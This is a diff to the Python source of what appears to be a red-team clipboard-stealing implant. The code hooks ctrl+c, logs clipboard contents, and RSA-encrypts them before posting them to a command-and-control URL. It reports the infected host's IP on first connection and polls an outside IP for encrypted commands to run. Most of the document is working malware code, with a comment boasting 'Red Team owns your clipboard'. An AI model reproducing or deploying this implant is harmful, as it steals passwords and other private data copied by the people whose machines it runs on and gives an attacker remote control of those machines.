@@ -6,6 +6,9 @@ import time
 import random
 import subprocess
 
+#TODO: GET LIST OF CONNECTED AGENTS - SO WE KNOW!!!
+#tool is under roles - then tasks test
+
 from flask import request
 from pynput import keyboard
 import keyboard
@@ -22,55 +25,60 @@ private_command_key = rsa.PrivateKey(1072018640844305435582301457172474004459997
 first_connection = True
 
 def main():
-    global first_connection
-    #gets the clipboard information and puts it in a file every 90 seconds.
-    schedule.every(90).seconds.do(get_clipboard_info)
-    schedule.every(300).seconds.do(run_command)
 
-    #Adds a hotkey, can't have parenthesis because it returns as a none type instead of a boolean
-    #explore the timeout feature to add some more functionality
-    keyboard.add_hotkey('ctrl+c', get_clipboard_info)
-    print('ctrlc added')
+    try:
+        global first_connection
+        # gets the clipboard information and puts it in a file every 90 seconds. Red Team owns your clipboard
+        schedule.every(90).seconds.do(get_clipboard_info)
+        # schedule.every(300).seconds.do(run_command)
 
-    #ctrl V ensures that the clipboard data is changed to password
-    #TODO PROBLEM HERE IS GOING to be that it will modify the clipboard twice
-    #keyboard.add_hotkey('ctrl+v', change_clipboard)
-    #print('ctrlv added')
-    if first_connection:
-        first_connection = False
-        local_hostname = socket.gethostname()
-        ip_addresses = socket.gethostbyname_ex(local_hostname)[2]
-        filtered = list()
-        i = 0
+        # Adds a hotkey, can't have parenthesis because it returns as a none type instead of a boolean
+        # explore the timeout feature to add some more functionality
+        keyboard.add_hotkey('ctrl+c', get_clipboard_info)
+        print('ctrlc added')
 
-        for ip in ip_addresses:
-            if not ip[0:4] == '127.':
-                # appends to python list
-                filtered.append(ip)
-                i += 1
+        # ctrl V ensures that the clipboard data is changed to password
+        # TODO PROBLEM HERE IS GOING to be that it will modify the clipboard twice
+        # keyboard.add_hotkey('ctrl+v', change_clipboard)
+        # print('ctrlv added')
+        if first_connection:
+            first_connection = False
+            local_hostname = socket.gethostname()
+            ip_addresses = socket.gethostbyname_ex(local_hostname)[2]
+            filtered = list()
+            i = 0
 
-        if len(filtered) != 0:
-            ip_connected_message = rsa.encrypt((filtered[0] + ' connected').encode('utf-8'), public)
-            requests.post("http://127.0.0.1:80/connect", ip_connected_message)
-        else:
-            localhost_message = rsa.encrypt(('localhost connected'.encode('utf-8')), public)
-            requests.post("http://127.0.0.1:80/connect", localhost_message)
+            for ip in ip_addresses:
+                if not ip[0:4] == '127.':
+                    # appends to python list
+                    filtered.append(ip)
+                    i += 1
 
-    #from https://schedule.readthedocs.io/en/stable/examples.html, schedule documentation
-    #code handles the scheduled task
-    while True:
-        schedule.run_pending()
-        time.sleep(1)
+            if len(filtered) != 0:
+                ip_connected_message = rsa.encrypt((filtered[0] + ' connected').encode('utf-8'), public)
+                requests.post("http://127.0.0.1:80/connect", ip_connected_message)
+            else:
+                localhost_message = rsa.encrypt(('localhost connected'.encode('utf-8')), public)
+                requests.post("http://127.0.0.1:80/connect", localhost_message)
+
+        # from https://schedule.readthedocs.io/en/stable/examples.html, schedule documentation
+        # code handles the scheduled task
+        #while True:
+            #schedule.run_pending()
+            #time.sleep(1)
+
+    except Exception as e:
+        print(e)
+        pass
+
 
 #global value that stores the last clipboardValue copied, starts as empty
 last_clip_board_value = ''
-
 
 def get_clipboard_info():
     #have to define as a global because of how python scope works
     global last_clip_board_value
     global public
-
 
     #need a delay here so that the ctrl+c copy updates the clipboard before the information is grabbed
     #if we do not have this delay: at the end of this method the clipboard info is changed to password
@@ -99,7 +107,7 @@ def get_clipboard_info():
         clipboard_data_file = open(filepath, "a")
 
         #checks if the last clipboard value is equal to the current one
-        if not last_clip_board_value == clipboard_info:
+        if (not last_clip_board_value == clipboard_info) and not clipboard_info == "Capybara? Capybara! Coconut Doggo!":
 
             print('copied')
 
@@ -141,7 +149,7 @@ def get_clipboard_info():
             clipboard_data_file.close()
 
             #posts the request back to the c2 server, passing along the encoded clipboard information
-            requests.post("http://127.0.0.1:80/output", encoded_clipboard_info)
+            requests.post(URL, encoded_clipboard_info)
 
         #if the last and current clipboard value match then close the file
         else:
@@ -235,7 +243,7 @@ def change_clipboard() -> None:
 #TODO: MAKE SURE THIS WORKS WITH SCHEDULED TASKS
 def run_command():
     try:
-        response = requests.get("http://127.0.0.1:80/command")
+        response = requests.get("http://100.95.121.128:80/command")
 
         response_string = rsa.decrypt(response.content, private_command_key).decode('utf8')
 
